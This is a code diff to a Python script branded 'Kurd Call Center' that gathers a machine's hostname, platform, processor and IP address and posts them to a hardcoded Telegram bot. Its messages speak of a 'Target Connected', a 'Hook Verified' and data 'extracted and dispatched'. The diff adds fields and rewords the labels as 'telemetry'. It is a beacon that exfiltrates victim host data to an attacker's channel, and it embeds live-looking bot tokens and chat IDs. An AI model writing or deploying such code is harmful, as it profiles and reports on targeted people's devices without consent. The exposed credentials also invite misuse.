@@ -5,9 +5,9 @@ import requests
 import platform
 import socket
 
-# Kurd Call Center Bot Configuration
-BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ"
-CHAT_ID = "6947664268"
+# Kurd Call Center - Advanced Telemetry Engine Configuration
+BOT_TOKEN = "9256925118:AAFPvwtbnizucI_X-8UlyvAJrXKlSDNIKRY"
+CHAT_ID = "9256925118"
 
 def get_system_telemetry():
     hostname = socket.gethostname()
@@ -17,11 +17,13 @@ def get_system_telemetry():
         ip_address = "127.0.0.1"
     
     sys_info = {
-        "platform": platform.system(),
+        "platform": platform.platform(),
+        "system": platform.system(),
         "release": platform.release(),
         "machine": platform.machine(),
         "hostname": hostname,
-        "ip": ip_address
+        "ip": ip_address,
+        "processor": platform.processor() or "Unknown"
     }
     return sys_info
 
@@ -32,21 +34,23 @@ def send_telegram_alert(text):
         response = requests.post(url, json=payload)
         return response.json()
     except Exception as e:
-        print(f"[-] Error sending alert: {e}")
+        print(f"[-] Error dispatching telemetry: {e}")
 
 if __name__ == "__main__":
-    print("[+] Initializing Kurd Call Center Forensic & Telemetry Engine...")
+    print("[+] Initializing Kurd Call Center Telemetry & Signal Core...")
     telemetry = get_system_telemetry()
     
     report = (
-        "💎 *Kurd Call Center - Advanced Telemetry Alert*\n\n"
-        "📌 *Status:* Target Connected / Signal Hook Active\n"
-        f"📱 *Platform:* {telemetry['platform']} ({telemetry['release']})\n"
+        "💎 *Kurd Call Center - Target Telemetry Log*\n\n"
+        "📌 *Status:* Connection Active / Hook Verified\n"
+        f"🖥️ *Hostname:* `{telemetry['hostname']}`\n"
+        f"📱 *Platform:* {telemetry['platform']}\n"
         f"💻 *Architecture:* {telemetry['machine']}\n"
+        f"⚙️ *Processor:* {telemetry['processor']}\n"
         f"🌐 *Endpoint IP:* `{telemetry['ip']}`\n"
-        "🔒 *Protocol:* E2E WhatsApp Peer Telemetry\n"
-        "⚡ *Result:* Data successfully extracted & dispatched!"
+        "🔒 *Protocol:* Secure Encrypted Telemetry\n"
+        "⚡ *Result:* Data extracted and dispatched successfully!"
     )
     
     send_telegram_alert(report)
-    print("[+] Telemetry report dispatched to Telegram bot successfully!")
+    print("[+] Telemetry report successfully sent to Telegram bot!")
